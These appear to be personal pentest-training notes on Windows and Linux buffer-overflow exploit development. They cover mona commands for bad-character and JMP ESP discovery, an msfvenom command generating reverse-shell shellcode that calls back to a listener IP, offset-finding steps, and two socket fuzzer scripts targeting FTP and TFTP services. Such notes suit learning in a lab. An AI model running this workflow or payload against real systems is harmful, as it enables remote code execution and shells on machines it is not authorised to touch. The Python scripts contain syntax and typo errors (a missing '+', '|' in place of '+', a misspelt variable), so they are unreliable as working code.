Network Exploit Development

[*] Tools - Windows Debugging
	Wingdb
	Windebug
	Immunity Debugger
		!mona patter_create 1100
			Text file created, contains the patter worth X amount of bites like 1100.
		!mona bytearray -b "\x00"
			Creates a bytearray.bin file full of characters except \x00, we want to find the bad characters and remove them.
		!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP address>
			You can also Right Click the ESP address and follow the dump.
			Once done, the Log window will point out possible bad characters.
		!mona bytearray -b "\x00\x07"
			Remove the more bad character from your exploit and from mona bytearray.bin file
			Continue this path until mona states shell code unmodified. You'll know when you get here.
		!mona jmp -r esp -cpb “\x00\x07\x2e\xa0"
			Find all of the JMP ESP instructions with addresses that do not include our bad characters.
			Remember these addresses, we need to use one for our payload to land.
			Also remember Little Endian, so the address will be backwords.
		msfvenom -p windows/shell_reverse_tcp LHOST=10.2.29.73 LPORT=80 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
			generate shellcode for your payload, all hex with missing bad characters
			Add Padding if needed, most likely will be needed.
			Look for the thm_exploit_oscp1.py exploit script for an example.
		!mona findmsp
		bp 0x77c35459
			This is a breakpoint
		Helpful links:
			https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst
	/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
		-l <length of characters for gdb testing>
	/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
		-q <memory address where we seg faulted>
			This will give us the exact length before seg fault
	checksec
		checksec <program>
	gdb
		gdb <program>
		disassemble <function like "main">
		r #  To run the program, arguments work as well
	readelf
		readelf -l <program>
			displays information about elf files
	ldd
		ldd <program>
			This will give you sharable dependencies during program

[*] Tools - Linux 
	man ascii
		Check HEX value for alphabet conversion.
	ascii
		└─$ ascii 0x41
		ASCII 4/1 is decimal 065, hex 41, octal 101, bits 01000001: prints as `A'
		Official name: Majuscule A
		Other names: Capital A, Uppercase A
	msf_pattern_offset <400 bytes more than crash> <EIP Address>
		msf_pattern_offset -l 2400 -q 6F43396E
	ANOTHER WAY - Use Mona if you are using Immunity Debugger (Windows)
		!mona findmsp -distance 2400
	

	Georgia Weidman script - warftpskel.py

		#!/usr/bin/env python
		
		import socket
		
		
		buffer = "A" * 1100
		
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect = s.connect(('192.168.1.50', 21))
		response = s.recv(1024)
		print(response)
		
		s.send('USER ' + buffer '\r\n')
		response = s.recv(1024)
		print(response)
		
		s.send('PASS PASSWORD\r\n')
		s.close()

	Georgia Weidman script - 3comfuzzer.py

		#!/usr/bin/env python
		import socket
		buffer_array = ["A" * 100]
		addition = 200
		
		while len(buffer_array) <= 50:
		    buffer_array.append("A" * addition)
		    addition += 100
		
		for value in buffer_array:
		    tftp_packet = "\x00\x02" + "Georgia" | "\x00" + value + "\x00"
		    print "Fuzzing with length " + str(len(value))
		    print tftp_packet
		    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		    s.sendto(tfpt_packet, ('10.0.0.37', 69))
		    response = s.recvfrom(2048)
		    print response


[*] Metasploit Module
	After creating a metasploit module, use msftidy to clean up your exploit:
		/usr/share/metasploit-framework/tools/dev/msftidy.rb
